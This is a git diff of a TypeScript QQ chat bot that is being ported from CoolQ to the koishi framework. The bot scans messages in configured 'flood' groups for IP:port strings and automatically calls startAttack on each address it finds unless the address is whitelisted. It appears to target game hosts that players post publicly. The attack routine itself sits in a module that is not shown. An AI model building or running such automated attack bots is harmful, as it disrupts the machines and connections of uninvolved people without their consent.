@@ -6,18 +6,12 @@ import yaml from "yaml";
 import { spawn } from "child_process";
 import { Attacker } from "./attacker";
 import moment from "moment";
-
-interface CoolQConfig {
-	host: string;
-	port: number;
-	qq: number;
-	accessToken: string;
-}
+import {AppConfig, App, Meta} from "koishi";
 
 interface Config {
 	address: string;
 	port: number;
-	coolq: CoolQConfig;
+	coolq: AppConfig;
 	floodQQGroups: Array<number>;
 	attackTimeout: number;
 	addressWhitelist: string[];
@@ -27,13 +21,7 @@ const log = bunyan.createLogger({
 	name: "hisoutensoku-terminator"
 });
 
-let CoolQ: CQWebSocket, config: Config;
-
-function sleep(time: number): Promise<void> {
-	return new Promise((resolve, reject) => {
-		setTimeout(resolve, time);
-	});
-};
+let app: App, config: Config;
 
 async function startAttack(address: string, port: number): Promise<boolean> {
 	if (_.contains(config.addressWhitelist, address)) {
@@ -60,11 +48,7 @@ async function startAttack(address: string, port: number): Promise<boolean> {
 	return true;
 }
 
-async function messageHandler(event: CQEvent, data: any, tags: CQTag[]): Promise<void> {
-	const groupID: number = data.group_id;
-	if (!groupID || !_.contains(config.floodQQGroups, groupID)) {
-		return;
-	}
+async function messageHandler(data: Meta<"message">): Promise<void> {
 	const messageMatch: RegExpMatchArray = data.message.match(/(\d{1,3}([\.: \uff1a]\d{1,3}){3})[\.: \uff1a]+(\d{4,5})/g);
 	if (!messageMatch) {
 		return;
@@ -75,25 +59,13 @@ async function messageHandler(event: CQEvent, data: any, tags: CQTag[]): Promise
 		const port = parseInt(patternArray[patternArray.length - 1]);
 		return startAttack(address, port);
 	});
-	const results: boolean[] =  await Promise.all(attackPromises);
+	const results: boolean[] = await Promise.all(attackPromises);
 }
 
 async function main(): Promise<void> {
 	config = yaml.parse(await fs.promises.readFile("./config.yaml", "utf8")) as Config;
-	CoolQ = new CQWebSocket(config.coolq);
-	CoolQ.on("ready", async () => {
-		log.info("bot init finished.");
-	});
-	CoolQ.on("error", async (err) => {
-		log.warn("bot error", err.toString());
-	});
-	CoolQ.on("socket.error", async (err) => {
-		log.warn("bot socket error", err.toString());
-	});
-	CoolQ.on("socket.close", async (err) => {
-		log.warn("bot socket close", err.toString());
-	});
-	CoolQ.on("message", messageHandler);
-	CoolQ.connect();
+	app = new App(config.coolq);
+	app.group(...config.floodQQGroups).receiver.on("message", messageHandler);
+	await app.start();
  }
 main();
